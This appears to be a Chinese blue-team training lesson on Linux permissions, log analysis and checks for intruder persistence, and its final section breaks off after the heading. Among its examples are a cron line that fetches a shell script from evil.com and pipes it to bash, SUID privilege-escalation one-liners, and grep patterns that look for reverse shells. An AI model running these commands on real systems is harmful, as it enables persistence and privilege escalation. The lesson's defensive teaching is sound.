---
day: 3
title: 操作系统安全基础与Linux权限管理
phase: 第一阶段
difficulty: ⭐ 入门
---

# Day 3：操作系统安全基础与Linux权限管理

> **阶段**：第一阶段 · 基础夯实周（零基础→初级岗达标） | **难度**：⭐ 入门 | **课时**：2-3小时

---

## 📋 今日学习目标

1. **理解操作系统的安全边界**：用户态 vs 内核态、进程隔离、文件权限——护网蓝队80%的操作都在和这三者打交道
2. **彻底搞懂Linux的UGO权限模型**：读(r)、写(w)、执行(x)的本质不是概念，而是"谁能对文件做什么"
3. **掌握Linux 12个关键安全目录**：/etc/passwd、/etc/shadow、/var/log、/tmp等，每个目录在护网中能用上的真实场景
4. **学会用命令"看"系统安全状态**：ps、netstat、ss、lsof，不用死记参数，理解"看什么→用什么"
5. **完成5个实际的安全检查操作**：查可疑进程→查异常连接→查新增用户→查定时任务→查文件篡改
6. **建立"攻击者在系统上会留什么痕迹"的初步意识**：这是后续溯源反制的基础

---

## 📖 核心知识讲解

### 一、操作系统安全——蓝队的第一道防线

#### 1.1 把操作系统想象成一座「办公楼」

> 🏢 操作系统 = 一栋办公楼，内核 = 楼管，进程 = 各办公室里工作的人，文件 = 文件柜，权限 = 门禁卡

```
┌─────────────────────────────────────────────────────────────────┐
│                        🔴 用户态（你能直接操作的部分）              │
│                                                                   │
│   ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐           │
│   │ 浏览器   │  │ Web服务  │  │ 数据库   │  │ 你自己   │           │
│   │ (chrome) │  │ (nginx)  │  │ (mysql)  │  │ 的程序   │           │
│   └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘           │
│        │              │              │              │               │
│   ─────┼──────────────┼──────────────┼──────────────┼────────────   │
│        │       系统调用（syscall）     │              │               │
│   ─────┼──────────────┼──────────────┼──────────────┼────────────   │
│        │              │              │              │               │
│   ┌────┴──────────────┴──────────────┴──────────────┴─────┐        │
│   │                    🟢 内核态（系统核心）                 │        │
│   │                                                         │        │
│   │  · 进程调度（谁先执行、谁后执行）                        │        │
│   │  · 内存管理（每个进程分多少内存、不能越界）              │        │
│   │  · 文件系统（谁能打开哪个文件柜）                        │        │
│   │  · 网络协议栈（数据怎么进来、怎么出去）                  │        │
│   │  · 设备驱动（硬盘、网卡、USB的调度）                     │        │
│   └─────────────────────────────────────────────────────────┘       │
│                              │                                      │
│                    ┌─────────┴─────────┐                            │
│                    │    🟡 硬件层      │                            │
│                    │  CPU、内存、磁盘   │                            │
│                    └───────────────────┘                            │
└─────────────────────────────────────────────────────────────────┘
```

**为什么要理解这个？** 护网蓝队的日常操作本质上是：
1. 在用户态查看各种日志、进程、网络连接（看办公楼里发生了什么事）
2. 判断有没有人通过漏洞拿到了不该有的权限（有没有人拿到了不该拿的门禁卡）
3. 阻止攻击者从用户态→内核态的提权行为（阻止有人撬锁进入机房）

---

#### 1.2 护网中蓝队最关心的三个安全问题

| 问题 | 大白话翻译 | 蓝队查什么 |
|:---|:---|:---|
| **权限提升** | 有人拿到了比自己权限高的权限，比如普通员工拿到了总经理门禁卡 | 查 `sudo` 日志、SUID文件、内核版本漏洞 |
| **进程隐藏** | 有个"坏人"躲在办公楼里，你叫不出他的名字 | 查 `/proc`、用 `unhide`、对比 `ps` 和 `netstat` |
| **持久化（后门）** | 坏人昨晚溜进办公楼，给自己配了一把备用钥匙，以后随时能进来 | 查 crontab、自启动服务、SSH authorized_keys |

---

### 二、Linux文件权限——UGO模型的完整解析

#### 2.1 10位权限字段，逐位拆解

每个文件/目录都有这样一串权限位：

```
┌─────┬──────────────────────────────────────────────────────┐
│     │  -   r w x   r w x   r w x                           │
│     │  ↑   ──┬───  ──┬───  ──┬───                          │
│     │  类型  所有者  所属组  其他人                          │
│     │       User   Group   Other                           │
└─────┴──────────────────────────────────────────────────────┘

第一位（文件类型）：
  -  = 普通文件（.txt .log .conf .py .sh）
  d  = 目录（directory）
  l  = 软链接（symbolic link，Windows里的"快捷方式"）
  c  = 字符设备（character device，键盘/显示器等）
  b  = 块设备（block device，硬盘等）
  s  = 套接字（socket，网络通信用的）
  p  = 管道（pipe，进程间通信）

后九位（UGO权限）：
  每组的三个位 = r(读) + w(写) + x(执行)
```

**逐位实例解析：**

```bash
# 例1：最经典的文件权限
$ ls -l /etc/passwd
-rw-r--r-- 1 root root 2500 Jan 15 08:30 /etc/passwd

拆解：
  -            → 普通文件
  rw-          → 所有者(root)可以读+写，不能执行
  r--          → 所属组(root组)只能读
  r--          → 其他人只能读

解释：只有root可以改密码文件，其他人都只能看，谁都无权直接"执行"它
```

```bash
# 例2：可执行程序
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68000 Jan 15 08:30 /usr/bin/passwd

拆解：
  -            → 普通文件
  rws          → 所有者(root)可以读+写+执行，s=SUID（执行时临时获得文件所有者的权限）
  r-x          → 所属组(root组)可以读+执行
  r-x          → 其他人可以读+执行

关键点：s标志（SUID）——普通用户执行passwd程序时，临时以root身份运行，
        这样才能修改只有root能写的/etc/shadow
        这就是一个"临时提权"的合法通道，也是攻击者最喜欢的利用点！
```

```bash
# 例3：目录权限
$ ls -ld /tmp
drwxrwxrwt 20 root root 4096 Jan 15 08:30 /tmp

拆解：
  d            → 目录
  rwx          → 所有者(root)可以读+写+进入
  rwx          → 所属组(root组)可以读+写+进入
  rwt          → 其他人可以读+写+进入，t=粘滞位（sticky bit）

关键点：t标志——虽然任何人都能在/tmp创建文件，但只能删除自己创建的文件
        如果没有t，恶意用户就可以删除别人的临时文件
```

#### 2.2 权限的数字表示法（八进制）

```
数字和权限的对应关系（背下来，面试必问）：
  r = 4  （二进制 100）
  w = 2  （二进制 010）
  x = 1  （二进制 001）
  - = 0

计算方式（对应位相加）：
  rwx = 4+2+1 = 7
  rw- = 4+2+0 = 6
  r-x = 4+0+1 = 5
  r-- = 4+0+0 = 4
  -w- = 0+2+0 = 2
  --x = 0+0+1 = 1
  --- = 0+0+0 = 0

最常用权限值：
  644 = rw-r--r--   → 普通文件（所有者能写，别人只能看）
  755 = rwxr-xr-x   → 可执行文件/目录（所有者全权，别人能看能执行）
  600 = rw-------    → 私密文件（只有所有者能读写，比如SSH私钥）
  777 = rwxrwxrwx   → ⚠️ 危险！所有人都有完全权限！
```

**面试官可能会问的："为什么SSH私钥必须是600权限？"**

> 答案：SSH客户端在连接时会检查私钥文件的权限。如果私钥文件对"组"或"其他人"开放了任何权限（读/写/执行），SSH会拒绝使用这个私钥，并报错"Permissions 0644 for id_rsa are too open"。这是因为如果别人能读到你的私钥，就等于别人拿到了你的身份证+密码，完全可以冒充你登录。600 = 只有所有者能读写，完全符合私钥的保密要求。

---

#### 2.3 目录权限的特殊含义（面试最爱考）

目录的r/w/x含义和普通文件**完全不一样**！记住这张表：

| 权限 | 对文件的意义 | 对目录的意义 |
|:---|:---|:---|
| **r（读）** | 可以查看文件内容（cat/less） | 可以列出目录中的文件名（ls可以列出名字） |
| **w（写）** | 可以修改文件内容（vi/echo >） | 可以在目录中创建/删除/重命名文件（不管文件本身权限如何！） |
| **x（执行）** | 可以运行该文件（./script.sh） | **可以进入该目录（cd到目录里），是访问目录内文件的前提条件** |

**面试最容易搞错的场景：**

```bash
# 假设有一个目录 dir1，权限为 rwx--x--x (711)
# 问：用户bob（属于others组）能列出dir1里的文件吗？能进入dir1吗？
# 
# 答案：
# bob能进入dir1（因为有x权限），但不能列出文件（因为没有r权限）
# bob可以访问他知道名字的文件（如 cat dir1/known_file.txt），
# 因为访问文件需要的是"目录的x权限"+"文件本身的权限"
# ls dir1 会失败（缺少r），但 cd dir1 && cat secret.txt 可以成功（如果知道文件名）
```

---

### 三、Linux 12大关键安全目录——护网蓝队必查清单

#### 3.1 用户与认证相关

**① /etc/passwd —— 用户账户清单**

```bash
# 格式：用户名:密码占位符:UID:GID:描述:家目录:登录Shell
# 示例：
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

蓝队检查重点：
```bash
# 1. 查有没有UID为0的非root用户（UID=0就是超级管理员）
awk -F: '($3 == 0) {print $1}' /etc/passwd

# 2. 查有没有最近新增的用户
ls -la /etc/passwd
stat /etc/passwd

# 3. 查有没有不该有登录Shell的用户却有了/bin/bash
awk -F: '$7 ~ /bash|sh/ {print $1, $7}' /etc/passwd
```

**② /etc/shadow —— 密码哈希存储（必须root才能读）**

```bash
# 格式：用户名:加密后密码:最后修改日期:最小天数:最大天数:警告天数:过期锁定天数:失效日期:保留
# 示例：
root:$6$salt$hash:19000:0:99999:7:::

# 蓝队检查重点：
# 1. 查没有密码的用户（第二列为空或!!或*）
awk -F: '($2 == "" || $2 == "!!" || $2 == "*") {print $1}' /etc/shadow

# 2. 查密码永不过期的用户（第五列为99999）
awk -F: '($5 == 99999) {print $1, $5}' /etc/shadow
```

**③ /etc/sudoers 和 /etc/sudoers.d/ —— sudo权限配置**

```bash
# 蓝队检查重点：
# 1. 查谁有无密码sudo权限（NOPASSWD标志）
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/

# 2. 查有没有人可以sudo ALL（所有人可以切任何用户执行任何命令）—— 这是投降条款！
grep -r "ALL=(ALL" /etc/sudoers /etc/sudoers.d/

# 3. 查有没有被注释掉的危险配置（注释≠删除！去井号就生效）
grep -r "^#" /etc/sudoers | grep "ALL"
```

#### 3.2 日志与审计相关

**④ /var/log/ —— 日志集中营**

```bash
/var/log/
├── auth.log     ← SSH登录认证日志（谁登进来了、密码错了几次）
├── syslog       ← 系统通用日志
├── messages     ← 内核和系统级消息（CentOS/RHEL用）
├── secure       ← 安全相关日志（CentOS/RHEL用）
├── nginx/       ← Web服务器日志
├── apache2/     ← Apache日志
└── audit/       ← 审计子系统日志（auditd）
```

**面试必知：每种入侵会在哪个日志留下痕迹**

| 攻击类型 | 产生的日志 | 关键词 |
|:---|:---|:---|
| SSH暴力破解 | /var/log/auth.log | `Failed password for`，连续出现 |
| SSH登录成功 | /var/log/auth.log | `Accepted password for` |
| sudo提权 | /var/log/auth.log | `sudo:` `COMMAND=` |
| 新增用户 | /var/log/auth.log | `new user` `useradd` |
| 修改密码 | /var/log/auth.log | `passwd` `password changed` |
| Web攻击 | nginx/access.log | 异常URI、SQL关键词、特殊字符 |
| 文件删除 | auditd日志 | `unlink` 系统调用 |

---

**⑤ /var/log/auth.log —— 认证日志深度分析**

```bash
# 真实分析流程：从不理解到看到攻击全景

# 第一步：查今天有多少登录失败
grep "Failed password" /var/log/auth.log | wc -l
# → 输出：1258  ← 如果这个数字很大，说明有人在暴力破解

# 第二步：看是谁在暴力破解（攻击IP TOP10）
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
# → 输出：
#   856 45.33.32.156    ← 这个IP可以立即封禁了
#   134 103.56.89.12
#    89 192.168.1.100   ← ⚠️ 内网IP！可能是横向移动

# 第三步：看有没有人成功登录了
grep "Accepted" /var/log/auth.log
# → 重点关注非工作时间登录的、从陌生IP登录的

# 第四步：查有没有人提权
grep "sudo:" /var/log/auth.log | grep "COMMAND"
# → 如果你是普通用户突然有了sudo操作，就是异常
```

#### 3.3 进程与网络相关

**⑥ /proc/ —— 进程虚拟文件系统（一切皆文件）**

```bash
# /proc不是真实目录，是内核在内存中映射的"进程快照"

# 蓝队最常用的 /proc 检查：
# 1. 查某个进程的完整命令行（攻击者可能用假进程名）
cat /proc/[PID]/cmdline | tr '\0' ' '

# 2. 查进程的工作目录（看看它在哪里活动）
ls -la /proc/[PID]/cwd

# 3. 查进程打开了哪些文件/网络连接
ls -la /proc/[PID]/fd/

# 4. 查进程的环境变量（可能藏密码、API密钥）
cat /proc/[PID]/environ | tr '\0' '\n'

# 5. 查所有进程列表及启动时间（找出最近启动的进程）
ls -lt /proc/*/cmdline 2>/dev/null | head -20 | while read p; do
  pid=$(echo $p | cut -d/ -f3)
  echo "$pid: $(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null)"
done
```

---

**⑦ /tmp 和 /dev/shm —— 攻击者的"临时藏身处"**

```bash
# /tmp 特性：所有人可读写、不自动清理、重启可能丢失也可能不丢失
# /dev/shm 特性：内存文件系统（tmpfs）、速度快、不占磁盘、重启一定丢失

# 攻击者喜欢在这两个目录做的事：
# 1. 下载恶意工具（wget/curl → /tmp/tools）
# 2. 存放Webshell（/tmp/shell.jsp → 通过Web访问）
# 3. 存放密码字典（/tmp/wordlist.txt）
# 4. 编译exploit（gcc -o /tmp/exploit exploit.c）

# 蓝队检查命令：
# 1. 找出/tmp下的可执行文件
find /tmp -type f -executable -ls

# 2. 找出/tmp下不属于任何用户的文件
find /tmp -nouser -o -nogroup

# 3. 找出/tmp和/dev/shm下的脚本文件
find /tmp /dev/shm -name "*.sh" -o -name "*.pl" -o -name "*.py" -o -name "*.php"

# 4. 找出最近1小时内创建/修改的文件
find /tmp /dev/shm -mmin -60 -ls
```

#### 3.4 启动与持久化相关

**⑧ /etc/crontab 与 /var/spool/cron/ —— 定时任务（持久化重灾区）**

```bash
# cron的层级结构：
# 系统级定时任务：/etc/crontab
# 用户级定时任务：/var/spool/cron/crontabs/[用户名]
# 定时任务目录：/etc/cron.d/、/etc/cron.daily/、/etc/cron.hourly/ 等

# 蓝队完整检查：
# 1. 查看所有用户的定时任务
for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== $user ==="
  crontab -u $user -l 2>/dev/null
done

# 2. 查系统级定时任务有无异常
grep -v "^#" /etc/crontab | grep -v "^$"

# 3. 找所有cron相关目录的可疑文件
find /etc/cron* -type f -exec ls -la {} \;

# 4. 重点查：定时任务里有没有下载行为
grep -r "wget\|curl\|nc\|bash -i\|/dev/tcp" /etc/cron* /var/spool/cron/

# ⚠️ 攻击者最喜欢的持久化方式：
#    */5 * * * * curl http://evil.com/shell.sh | bash
#    每5分钟从攻击者服务器下载脚本并执行 → 即使你杀了进程，5分钟后它又活了
```

**⑨ /etc/rc.local 和 /etc/init.d/ —— 开机自启（更深层的持久化）**

```bash
# 检查所有开机自启的服务和脚本
# 1. systemd服务（最常用）
systemctl list-unit-files --type=service | grep enabled

# 2. rc.local（老式开机脚本）
cat /etc/rc.local

# 3. /etc/profile 和 ~/.bashrc —— 用户登录时自动执行
# 攻击者可能在用户登录时自动运行恶意命令
grep -r "curl\|wget\|nc\|bash" /etc/profile /etc/bash.bashrc /home/*/.bashrc
```

#### 3.5 SSH与远程访问相关

**⑩ ~/.ssh/authorized_keys —— SSH免密登录后门**

```bash
# 正常场景：运维为了方便，配置了自己的公钥，可以免密登录
# 攻击场景：攻击者拿到shell后，把自己的公钥追加进去，以后永远免密登录

# 蓝队检查清单：
# 1. 查所有用户的authorized_keys
for user_home in /home/* /root; do
  user=$(basename $user_home)
  if [ -f "$user_home/.ssh/authorized_keys" ]; then
    echo "=== $user ==="
    cat "$user_home/.ssh/authorized_keys"
    echo ""
  fi
done

# 2. 关注authorized_keys的修改时间（如果某天突然被修改了，又没人报过，就是异常）
find /home /root -name "authorized_keys" -ls

# 3. 查有没有不应该存在的.ssh目录（比如www-data这种Web用户不应该有）
find /home /root /var -name ".ssh" -type d
```

**⑪ /etc/hosts.allow 和 /etc/hosts.deny —— TCP Wrapper访问控制（老但有效）**

```bash
# /etc/hosts.deny 格式：服务名:来源IP
# 攻击者可能删除自己的IP，或者添加规则放通自己

# 蓝队检查命令：
# 检查是否有人修改了访问控制
ls -la /etc/hosts.allow /etc/hosts.deny
cat /etc/hosts.allow
cat /etc/hosts.deny
```

#### 3.6 文件完整性相关

**⑫ /etc/ —— 配置文件集中营（重点保护对象）**

```bash
# 攻击者最喜欢修改的配置文件（用于持久化、提权、隐藏）
# 检查方法：对比文件修改时间，找出不是自己改过的修改

# 关键文件清单：
/etc/passwd           ← 可能添加了隐藏账户
/etc/shadow           ← 可能修改了密码哈希
/etc/group            ← 可能把自己加进了root组
/etc/sudoers          ← 可能加了NOPASSWD
/etc/ssh/sshd_config  ← 可能允许root直接SSH登录
/etc/sysctl.conf      ← 可能关闭了安全特性

# 批量检查最近7天被修改过的配置文件
find /etc -type f -mtime -7 -ls | sort -rn

# 安装aide或tripwire做基线，然后：
# aide --check → 自动报告所有文件变化
```

---

### 四、5个必会安全检查命令

#### 检查1：查可疑进程

```bash
# 目标：找出不属于正常业务的进程

# 步骤一：列出所有进程，按CPU使用率排序
ps aux --sort=-%cpu | head -30

# 步骤二：列出所有进程树（父子关系）
ps auxf

# 步骤三：找出没有占用终端的进程（守护进程/后台进程）
ps aux | grep "? "

# 步骤四：找出名称可疑的进程
# 常见可疑特征：
# - 进程名看起来像系统进程但位置不对（如 /tmp/bash 而不是 /bin/bash）
# - 进程名是随机字符串
# - 进程运行的命令行包含 curl/wget/nc/bash -i
# - 父进程异常（如Web服务fork出了shell）

# 实用脚本：对比进程列表，找出不在白名单中的进程
known_processes="nginx|apache|mysql|sshd|systemd|cron|rsyslog"
ps aux | grep -vE "$known_processes" | grep -v grep
```

#### 检查2：查异常网络连接

```bash
# 目标：找出异常的外部连接和监听端口

# 步骤一：列出所有监听端口
ss -tlnp
# -t = TCP, -l = 监听中(listening), -n = 数字格式(不解析域名), -p = 显示进程信息

# 步骤二：列出所有已建立的连接
ss -tnp | grep ESTAB

# 步骤三：看哪些进程在监听非标准端口（非22,80,443等）
ss -tlnp | grep -vE ":(22|80|443|3306|6379|8080) "

# 步骤四：查有没有反弹Shell（反向连接的特征）
ss -tnp | grep ESTAB | while read line; do
  pid=$(echo $line | grep -oP 'pid=\K\d+')
  if [ -n "$pid" ]; then
    cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
    # 反弹Shell关键词
    if echo "$cmdline" | grep -qE "bash -i|nc |/dev/tcp|python.*socket"; then
      echo "⚠️ 可疑反弹Shell: PID=$pid CMD=$cmdline"
    fi
  fi
done
```

#### 检查3：查新增用户

```bash
# 目标：发现攻击者添加的后门账户

# 步骤一：看/etc/passwd的修改时间
ls -la /etc/passwd /etc/shadow /etc/group

# 步骤二：列出所有能登录的用户（Shell是bash或sh的）
cat /etc/passwd | grep -E "/bin/(bash|sh)$"

# 步骤三：看最近创建的用户（按UID排序，UID超过1000的一般是用户自己加的）
awk -F: '($3 >= 1000) {print $0}' /etc/passwd

# 步骤四：看UID=0的用户（只能有root一个）
awk -F: '($3 == 0) {print $1, $3}' /etc/passwd
```

#### 检查4：查定时任务异常

```bash
# 目标：发现攻击者的持久化机制

# 步骤一：查看所有用户的crontab
for user in $(awk -F: '{print $1}' /etc/passwd); do
  cron=$(crontab -u $user -l 2>/dev/null)
  if [ -n "$cron" ]; then
    echo "=== $user ==="
    echo "$cron"
  fi
done

# 步骤二：查看系统cron目录
ls -la /etc/crontab /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# 步骤三：关注这些标志性的恶意定时任务模式
grep -rE "(wget|curl|nc |bash -i|python -c|\&/dev/tcp)" /etc/cron* /var/spool/cron/ 2>/dev/null
```

#### 检查5：查关键文件是否被篡改

```bash
# 目标：发现系统关键文件被修改的痕迹

# 步骤一：查看最近7天修改过的所有文件
find /etc /bin /sbin /usr/bin /usr/sbin -type f -mtime -7 -ls

# 步骤二：重点关注这些目录（攻击者常放东西的地方）
find /tmp /dev/shm /var/tmp -type f -mtime -1 -ls

# 步骤三：查找所有隐藏文件和目录
find / -name ".*" -type f 2>/dev/null | grep -v "^/proc" | grep -v "^/sys"

# 步骤四：查找SUID文件（有s标志位的文件，可以被临时提权）
find / -perm -4000 -type f 2>/dev/null | grep -v "^/proc"
# 如果发现/usr/bin/find有SUID位 → 可以find . -exec /bin/sh \; 提权
# 如果发现/usr/bin/vim有SUID位 → 可以vim里:!bash提权
```

---

### 五、攻击者在系统上留下的"痕迹地图"

> 把以下这些位置想象成"攻击者走过的脚印"，护网蓝队就是按图索骥。

```
攻击行为                        →  痕迹位置                     →  检查命令
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
暴力破解SSH                     → /var/log/auth.log          → grep "Failed password"
成功登录                        → /var/log/auth.log + wtmp   → last -n 50
添加后门账户                    → /etc/passwd + /etc/shadow  → ls -la + awk判断UID
写入SSH公钥                     → ~/.ssh/authorized_keys     → find查找修改时间
反弹Shell                       → ss -tnp + /proc/PID/cmdline → 查异常ESTAB连接
下载工具                        → /tmp /dev/shm + bash_history → find -mmin -60
创建定时任务                    → crontab -l 全量扫描         → for循环+脚本检查
提权操作                        → auth.log中的sudo记录        → grep "sudo:"
进程隐藏                        → /proc + ss -tnp对比ps输出   → 差异即异常
横向移动                        → auth.log中内网IP登录        → 查内网IP段登录记录
文件上传/篡改                   → 文件mtime + aide对比        → find -mtime -N
```

---

## 🧪 实操练习

### 练习1：在自己的Linux环境做一次"安全巡检"

```bash
#!/bin/bash
# 保存为 security_check.sh，执行 bash security_check.sh
# 这是一份蓝队新人的每日安全巡检用脚本

echo "===== 1. 系统基本信息 ====="
echo "主机名: $(hostname)"
echo "系统版本: $(cat /etc/os-release | grep PRETTY_NAME)"
echo "运行时间: $(uptime)"
echo "当前登录用户:"
who

echo ""
echo "===== 2. 用户安全检查 ====="
echo "UID=0的用户（应该只有root）:"
awk -F: '($3 == 0) {print $1}' /etc/passwd

echo "能登录的用户:"
grep -E "/bin/(bash|sh)$" /etc/passwd | cut -d: -f1

echo "最近登录记录:"
last -n 20 | head -20

echo ""
echo "===== 3. 进程安全检查 ====="
echo "CPU占用TOP10进程:"
ps aux --sort=-%cpu | head -11 | tail -10

echo "可疑进程（不含常见系统进程）:"
ps aux | grep -vE "nginx|apache|mysql|sshd|systemd|cron|rsyslog|bash|ps|grep" | head -20

echo ""
echo "===== 4. 网络安全检查 ====="
echo "所有监听端口:"
ss -tlnp

echo "已建立的连接:"
ss -tnp | grep ESTAB | head -20

echo ""
echo "===== 5. 定时任务检查 ====="
echo "系统级定时任务:"
grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$"
ls -la /etc/cron.d/ 2>/dev/null

echo "用户级定时任务:"
for user in $(awk -F: '{print $1}' /etc/passwd); do
  cron_output=$(crontab -u $user -l 2>/dev/null)
  if [ -n "$cron_output" ]; then
    echo "--- $user ---"
    echo "$cron_output"
  fi
done

echo ""
echo "===== 6. 关键文件修改检查 ====="
echo "最近7天修改过的系统文件:"
find /etc -type f -mtime -7 -ls 2>/dev/null | head -20

echo ""
echo "===== 7. SSH安全检查 ====="
echo "SSH authorized_keys文件:"
find /home /root -name "authorized_keys" -ls 2>/dev/null

echo ""
echo "===== 8. /tmp 和 /dev/shm 检查 ====="
echo "/tmp下的可执行文件:"
find /tmp -type f -executable -ls 2>/dev/null | head -10

echo "/dev/shm下的文件:"
find /dev/shm -type f -ls 2>/dev/null | head -10

echo ""
echo "======== 巡检完成 ========"
echo "将上述输出保存为 日期_安全检查.txt 存入值班记录"
```

### 练习2：手动排查一个"可疑进程"

```bash
# 场景：你在ps中发现一个叫 /usr/lib/systemd/systemd-update 的进程
# 它CPU占用很高，但你记得正常系统没有这个进程
# → 模拟你的排查流程：

# ① 确认进程是否存在
ps aux | grep systemd-update

# ② 查看进程详情
PID=12345  # 替换为实际PID
ls -la /proc/$PID/
cat /proc/$PID/cmdline | tr '\0' ' '

# ③ 查看进程打开了哪些文件
ls -la /proc/$PID/fd/

# ④ 查看进程的网络连接
ls -la /proc/$PID/fd/ | grep socket

# ⑤ 查看进程的可执行文件本身
readlink -f /proc/$PID/exe
file $(readlink -f /proc/$PID/exe)
strings $(readlink -f /proc/$PID/exe) | head -50

# ⑥ 查看进程的环境变量（可能藏有攻击者服务器的地址）
cat /proc/$PID/environ | tr '\0' '\n'
```

### 练习3：SUID提权漏洞排查

```bash
# 找出所有SUID文件，并判断哪些是危险的

# 已知危险的SUID利用链（面试常考）：
# 以下命令如果带有SUID位，任何人都可以利用它们进行提权

# ① find 命令
#    利用方法：find . -exec /bin/sh -p \; -quit
#    检查：ls -la $(which find) | grep rws

# ② vim 命令
#    利用方法：vim -c ':!bash'
#    检查：ls -la $(which vim) | grep rws

# ③ bash 命令
#    利用方法：bash -p
#    检查：ls -la $(which bash) | grep rws

# ④ python/perl/ruby
#    利用方法：python -c 'import os; os.system("/bin/bash")'
#    检查：ls -la $(which python) $(which python3) | grep rws

# ⑤ nmap（旧版本有--interactive模式）
#    利用方法：nmap --interactive → 输入 !sh
#    检查：ls -la $(which nmap) | grep rws

# 完整检查脚本：
echo "===== SUID危险命令检查 ====="
danger_commands=("find" "vim" "vi" "nano" "bash" "sh" "python" "python3" "perl" "ruby" "php" "less" "more" "awk" "nmap" "cp" "mv" "chmod")
for cmd in "${danger_commands[@]}"; do
  cmd_path=$(which $cmd 2>/dev/null)
  if [ -n "$cmd_path" ]; then
    if ls -la "$cmd_path" 2>/dev/null | grep -q "rws"; then
      echo "⚠️ 危险SUID: $cmd_path"
      ls -la "$cmd_path"
    fi
  fi
done
echo "===== 检查完成 ====="
```

---

## 📊 面试模拟：操作系统安全

### 常见面试问题与最佳回答

**Q1："Linux中，一个普通用户如何临时获得root权限来修改密码？"**

> **标准回答**：用户执行 `/usr/bin/passwd`，这个程序有SUID位（权限为 rwsr-xr-x，所有者是root）。SUID的作用是：当任何人执行这个程序时，程序以文件所有者（root）的身份运行，而不是以执行者的身份运行。所以普通用户执行passwd时，passwd以root权限运行，可以修改/etc/shadow文件。修改完成后程序退出，root权限也随之消失。这就是"最小权限原则"的体现——只在需要的时候临时获得权限，用完即归还。

**追问："如果系统管理员不小心给/bin/bash加了SUID位，有什么后果？"**

> **标准回答**：这是灾难性的。任何普通用户执行 `bash -p` 就能获得root shell。因为bash有SUID位时会以root身份运行，`-p` 参数让bash不降权，用户直接得到root身份。这意味着整个系统的权限体系崩溃了。面试官，您可以现在检查一下：`ls -la /bin/bash`，正常情况下应该是 rwxr-xr-x，没有s标志。

**Q2："/tmp目录的权限是1777，解释一下每个数字的含义，以及为什么不用0777？"**

> **标准回答**：1777 = sticky bit(1) + 所有者rwx(7) + 组rwx(7) + 其他人rwx(7)。Sticky bit（粘滞位）的作用是：即使目录对所有人开放写权限，用户也只能删除自己创建的文件，不能删除别人的文件。如果用0777（没有粘滞位），任何用户都能在/tmp中删除任何其他用户的文件，对系统稳定性和安全性是毁灭性的。面试官，比如用户A的临时文件被用户B恶意删除，会导致A的程序崩溃，这就是为什么/tmp必须设置粘滞位。

**Q3："攻击者拿到了webshell后，通常会做哪些持久化操作？你作为蓝队怎么排查？"**

> **标准回答**：攻击者最常见的6种持久化方式及排查方法：
> 1. **写入SSH公钥** → 查 `find /home /root -name authorized_keys -ls`，关注修改时间
> 2. **添加定时任务** → 用脚本遍历所有用户的crontab，关注curl/wget/bash关键词
> 3. **创建后门账户** → `awk -F: '$3==0' /etc/passwd` 查UID=0的账户
> 4. **修改自启动服务** → `systemctl list-unit-files | grep enabled` 查异常服务
> 5. **植入rootkit** → 用rkhunter/chkrootkit扫描，对比ps和/proc结果
> 6. **替换系统命令** → `rpm -Va` (RHEL) 或 `debsums` (Debian) 做完整性检查
> 
> 排查的核心思路是：攻击者来了就不会一次就完，他们会给自己留后门以便随时回来。蓝队的任务就是堵死所有"回来"的路。

---

## ⚠️ 常见误区与避坑指南

| 误区 | 真相 |
|:---|:---|
| ❌ "chmod 777 xxx 方便省事" | 这是安全工程师绝对不能有的心态。777 = 向所有用户开放所有权限 = 引狼入室。正确的做法是：先用最小权限(如600/700)，遇到问题再加。 |
| ❌ "root用户反正什么都能干，不用分权限了" | root用户下所有程序都以root权限运行。一个root用户执行的恶意脚本 = 系统完全沦陷。最佳实践：日常操作只用普通用户，必要时用sudo。 |
| ❌ "日志太多了懒得看，反正有防火墙" | 70%的数据泄露在日志里都有痕迹，关键是你没看。防火墙只能拦80%，剩下的20%全靠日志分析。 |
| ❌ "定时任务没人会动，不用检查" | 定时任务是攻击者最爱的持久化方式，隐蔽且持久。必须建立定时任务的变更审批和定期审查机制。 |
| ❌ "把文件删了就是清理干净了" | 攻击者可能隐藏了第二个后门。处理事件必须遵循：发现→隔离→取证→清除→加固→验证 六步法。只删文件不加固 = 他一会儿就回来。 |
| ❌ "SUID文件是系统自带的，不管它" | 每个SUID文件都是一个潜在的提权通道。必须建立SUID文件清单，任何新增/删除都要审查。 |

---

## 📈 学习进度自检

完成今日学习后，你应该能回答以下问题：

1. **【基础】** Linux中 `rwxr-xr--` 对文件和对目录分别意味着什么？
2. **【基础】** `chmod 640 file` 等于什么权限？这个权限适合什么场景？
3. **【进阶】** 攻击者在你的系统上拿到了普通用户shell，你如何快速检查他有没有留下持久化后门？
4. **【进阶】** 你发现 `/var/log/auth.log` 中有大量来自同一个IP的 `Failed password` 记录，你应该怎么处理和汇报？
5. **【实战】** 你在 `ss -tnp` 发现有个进程连接到境外IP的4444端口，PID是23456，请写出你的排查命令步骤。
6. **【理论】** 解释SUID、SGID、Sticky Bit的区别和使用场景。为什么/tmp需要Sticky Bit？

---

## 📝 今日总结

> **Day 3 核心收获：**
> 
> 1. 操作系统安全 = 管住"谁"能"对什么"做"什么操作"——权限是安全的第一道防线
> 2. UGO权限模型是理解所有Linux安全检查的基础，攻防两端都要精通
> 3. 12个关键目录是蓝队日常巡检的CHECKLIST，不用全背但要知道在哪个目录找什么
> 4. 5大检查命令（进程、网络、用户、定时任务、文件完整性）是每日值守的必修课
> 5. 攻击者在系统上必定留痕迹——蓝队的核心能力就是知道"去哪找"+"找到了怎么判"
> 6. 安全巡检脚本可以自动化80%的日常检查工作，剩下的20%靠经验和直觉

---

## 🔎 Linux应急响应中最常被忽略的5个检查点——攻击者藏得最深的地方

以下5个位置是攻击者最爱藏后门但蓝队新人最容易遗漏的地方：

```markdown
